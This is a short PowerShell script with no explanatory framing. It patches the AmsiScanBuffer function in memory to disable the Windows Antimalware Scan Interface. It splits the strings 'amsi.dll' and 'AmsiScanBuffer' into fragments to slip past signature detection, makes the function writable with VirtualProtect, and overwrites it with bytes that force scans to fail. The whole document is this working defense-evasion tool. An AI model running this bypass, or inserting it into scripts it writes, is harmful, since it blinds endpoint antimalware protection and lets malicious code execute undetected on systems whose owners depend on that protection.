$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$LibraryName = "am" + "si.dll"
$LoadLibrary = [Win32]::LoadLibrary($LibraryName)
$hexAddress = $LoadLibrary.ToString("X")
Write-Host "[+] ${LibraryName} address: 0x${hexAddress}"

$APIName = "Amsi" + "Scan" + "Buffer"
$Address = [Win32]::GetProcAddress($LoadLibrary, $APIName)
$hexAddress = $Address.ToString("X")
Write-Host "[+] ${APIName} address: 0x${hexAddress}"

$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
Write-Host "[+] WRITE access granted"

$Buff = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)

$CopyMethod = [System.Runtime.InteropServices.Marshal].GetMethod("Copy", [Type[]]([Byte[]], [int], [IntPtr], [int]))
$CopyMethod.Invoke($null, @($Buff, 0, $Address, $Buff.Count))
Write-Host "[+] ${LibraryName} patched!"
